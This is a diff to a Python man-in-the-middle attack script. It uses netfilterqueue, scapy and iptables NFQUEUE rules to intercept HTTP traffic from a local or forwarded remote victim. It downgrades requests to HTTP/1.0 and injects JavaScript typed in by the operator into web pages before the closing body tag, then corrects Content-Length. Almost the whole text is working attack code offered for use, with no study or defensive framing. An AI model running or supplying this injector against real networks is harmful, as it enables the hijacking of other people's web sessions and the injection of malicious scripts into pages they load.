@@ -2,6 +2,7 @@
 # iptables -I OUTPUT -j NFQUEUE --queue-num 0
 # iptables -I INPUT -j NFQUEUE --queue-num 0   [These Two commands to be used on Local Computer.]
 # Modify the Injection_code Variable to your code. [Javascript Codes are Preferable]
+# injection_code = "<script>alert('skv1');</script>"
 
 import netfilterqueue
 import scapy.all as scapy
@@ -9,13 +10,14 @@ from termcolor import colored
 import re
 import os
 import argparse
-
-injection_code = "<script>alert('skv1910');</script>"
+import sys
 
 def get_arguments():
     parser = argparse.ArgumentParser()
     parser.add_argument("-m", "--machine", dest="machine", help="Choose Target Machine (remote or local)")
     args = parser.parse_args()
+    if not args.machine:
+        parser.error(colored("[-] Target Machine not Specified. Use -h to display help", "yellow"))
     return args
 
 def process_queue():
@@ -42,14 +44,13 @@ def process_packets(packet):
                 print(colored("[+] Downgraded a Request to HTTP/1.0.", "green"))
             elif scapy_packet[scapy.TCP].sport == 80:
                 print(colored("[+] Response", "yellow"))
-                inject_code = injection_code
                 if "</body>" in load:
-                    load = load.replace("</body>", injection_code + "</body>")
+                    load = load.replace("</body>", script + "</body>")
                     print(colored("[+] Injected the Code.", "yellow"))
                     content_lenth_search = re.search("(?:Content-Length:\s)(\d*)", load)
                     if content_lenth_search and "text/html" in load:
                         content_lenth = content_lenth_search.group(1)
-                        modified_content_lenth = int(content_lenth) + len(injection_code)
+                        modified_content_lenth = int(content_lenth) + len(script)
                         load = load.replace(content_lenth, str(modified_content_lenth))
                         print(colored("[+] Modified the Content Lenth.", "yellow"))
             if load != scapy_packet[scapy.Raw].load:
@@ -68,12 +69,19 @@ def launch_attack():
         print(colored("[+] IPTables rules set to Local Machine.", "green"))
     elif args.machine == "remote":
         os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
-        print(colored("[+] IPTables rules set to Remote Machine."))
+        print(colored("[+] IPTables rules set to Remote Machine.", "green"))
     try:
         process_queue()
     except KeyboardInterrupt:
         print(colored("[-] Ctrl-C Detected... Quitting.. Restoring IPTables rules", "yellow"))
         os.system('iptables --flush')
         print(colored("[+] Restored IPTables.", "green"))
+
+try:
+    args = get_arguments()
+    script = raw_input(colored("Enter the Script to be Injected >> ", "yellow"))
+except KeyboardInterrupt:
+    print("Ctrl+C Detected...Quitting...")
+    sys.exit()
 
 launch_attack()
